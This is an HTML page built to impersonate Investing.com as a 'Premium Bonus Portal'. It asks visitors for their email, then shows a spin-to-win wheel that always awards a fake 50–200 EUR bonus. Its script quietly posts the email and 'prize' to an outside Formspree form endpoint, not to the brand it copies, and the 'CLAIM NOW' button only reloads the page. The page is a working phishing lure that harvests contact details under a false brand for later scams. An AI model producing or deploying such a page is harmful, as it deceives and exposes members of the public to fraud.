<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investing.com | Premium Bonus Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --inv-orange: #f39c12;
            --inv-blue: #0b1e33;
            --inv-light-blue: #163152;
            --gold-gradient: linear-gradient(135deg, #f39c12 0%, #ffcc00 100%);
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: radial-gradient(circle at center, #163152 0%, #050c16 100%);
            font-family: 'Segoe UI', Tahoma, sans-serif;
            color: white;
            overflow: hidden;
        }

        /* ШАПКА САЙТА */
        .header-ui { text-align: center; margin-bottom: 20px; z-index: 10; width: 100%; }
        .logo-text { font-size: 38px; font-weight: 900; letter-spacing: -1px; color: white; }
        .logo-text span { color: var(--inv-orange); }

        /* ОКНО ВХОДА */
        #auth-container {
            position: fixed;
            inset: 0;
            background: rgba(5, 12, 22, 1);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .auth-box {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            color: #333;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            border-top: 6px solid var(--inv-orange);
        }

        .auth-logo { font-size: 32px; font-weight: 900; color: #0b1e33; margin-bottom: 15px; }
        .auth-logo span { color: var(--inv-orange); }

        .auth-box input {
            width: 100%;
            padding: 16px;
            margin: 15px 0;
            border: 2px solid #e1e4e8;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .auth-box button {
            width: 100%;
            padding: 16px;
            background: var(--inv-blue);
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 700;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
        }

        /* КОЛЕСО */
        .wheel-wrapper {
            position: relative;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            transition: 1s;
        }

        .wheel-container {
            position: relative;
            width: 450px;
            height: 450px;
            border-radius: 50%;
            border: 12px solid #050c16;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(0,0,0,0.5);
        }

        #wheel { width: 100%; height: 100%; transition: transform 7s cubic-bezier(0.15, 0, 0.15, 1); }

        .pointer {
            position: absolute;
            top: -10px; left: 50%;
            transform: translateX(-50%);
            width: 40px; height: 50px;
            background: #fff;
            clip-path: polygon(50% 100%, 0 0, 100% 0);
            z-index: 100;
        }

        .center-hub {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 70px; height: 70px;
            background: #050c16;
            border: 4px solid var(--inv-orange);
            border-radius: 50%;
            z-index: 50;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .center-hub i { font-size: 25px; color: var(--inv-orange); }

        #spin-btn {
            margin-top: 30px;
            background: var(--gold-gradient);
            border: none;
            padding: 18px 70px;
            border-radius: 6px;
            font-weight: 900;
            cursor: pointer;
            text-transform: uppercase;
            font-size: 1.2rem;
            color: #000;
        }

        /* МОДАЛКА */
        .modal {
            position: fixed;
            inset: 0;
            background: rgba(0, 5, 15, 0.98);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 3000;
        }

        .modal-content {
            background: white;
            padding: 50px;
            border-radius: 15px;
            text-align: center;
            color: #000;
            max-width: 400px;
        }

        .amount { font-size: 4.5rem; font-weight: 900; color: var(--inv-orange); margin: 15px 0; }
        #already-played { display: none; color: #ffbcbc; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="auth-container">
        <div class="auth-box">
            <div class="auth-logo">Investing<span>.com</span></div>
            <h2>Bonus Activation</h2>
            <p>Please enter your email to participate in the exclusive EUR reward draw.</p>
            <input type="email" id="user-email" placeholder="example@investing.com">
            <button id="auth-btn">CONFIRM & ACCESS</button>
            <p id="error-msg" style="color: red; display: none; margin-top: 10px;"></p>
        </div>
    </div>

    <div class="header-ui">
        <div class="logo-text">Investing<span>.com</span></div>
    </div>

    <div class="wheel-wrapper">
        <div class="pointer"></div>
        <div class="center-hub"><i class="fas fa-euro-sign"></i></div>
        <div class="wheel-container">
            <canvas id="wheel" width="450" height="450"></canvas>
        </div>
    </div>

    <button id="spin-btn">Spin to Win</button>
    <p id="already-played">Access Denied: Your daily limit has been reached.</p>

    <div id="win-modal" class="modal">
        <div class="modal-content">
            <h2>REWARD UNLOCKED!</h2>
            <div class="amount" id="win-amount">0 EUR</div>
            <p>Your bonus has been successfully reserved.</p>
            <button onclick="location.reload()">CLAIM NOW</button>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheel');
        const ctx = canvas.getContext('2d');
        const spinBtn = document.getElementById('spin-btn');
        const authBtn = document.getElementById('auth-btn');
        const authContainer = document.getElementById('auth-container');
        const modal = document.getElementById('win-modal');
        const winAmountText = document.getElementById('win-amount');
        
        const FORMSPREE_URL = "https://formspree.io/f/xrewvoya"; 
        const bonuses = ["50 EUR", "75 EUR", "100 EUR", "125 EUR", "150 EUR", "175 EUR", "200 EUR", "90 EUR"];
        const colors = ["#0b1e33", "#163152"];
        const arc = (2 * Math.PI) / bonuses.length;
        let currentRotation = 0;
        let userEmail = "";

        // Отрисовка колеса
        function draw() {
            for (let i = 0; i < bonuses.length; i++) {
                ctx.fillStyle = colors[i % 2];
                ctx.beginPath(); ctx.moveTo(225, 225);
                ctx.arc(225, 225, 225, i * arc, (i + 1) * arc);
                ctx.fill();
                ctx.save();
                ctx.translate(225, 225); ctx.rotate(i * arc + arc / 2);
                ctx.textAlign = "right"; ctx.fillStyle = (i % 2 === 0) ? "#f39c12" : "#ffffff";
                ctx.font = "bold 20px Arial"; ctx.fillText(bonuses[i], 210, 10);
                ctx.restore();
            }
        }
        draw();

        // Проверка на повторную игру
        if (localStorage.getItem('hasPlayed')) {
            authContainer.style.display = "none";
            spinBtn.style.display = "none";
            document.getElementById('already-played').style.display = "block";
        }

        // Логика входа
        authBtn.addEventListener('click', () => {
            const emailInput = document.getElementById('user-email').value;
            if (emailInput.includes('@') && emailInput.length > 5) {
                userEmail = emailInput;
                authContainer.style.display = "none";
            } else {
                const err = document.getElementById('error-msg');
                err.innerText = "Please enter a valid email address.";
                err.style.display = "block";
            }
        });

        // Логика спина
        spinBtn.addEventListener('click', () => {
            if (spinBtn.disabled || localStorage.getItem('hasPlayed')) return;
            spinBtn.disabled = true;

            const targetIndex = Math.floor(Math.random() * bonuses.length);
            const targetValue = bonuses[targetIndex];
            const landingPoint = 360 - (targetIndex * (360/bonuses.length)) - (360/bonuses.length/2) - 90;
            currentRotation += (360 * 10) + landingPoint;
            canvas.style.transform = `rotate(${currentRotation}deg)`;

            setTimeout(() => {
                winAmountText.innerText = targetValue;
                modal.style.display = "flex";
                localStorage.setItem('hasPlayed', 'true');
                
                fetch(FORMSPREE_URL, {
                    method: 'POST',
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: userEmail, win: targetValue })
                });

                confetti({ particleCount: 200, spread: 80, origin: { y: 0.6 } });
            }, 7200);
        });
    </script>
</body>
</html>
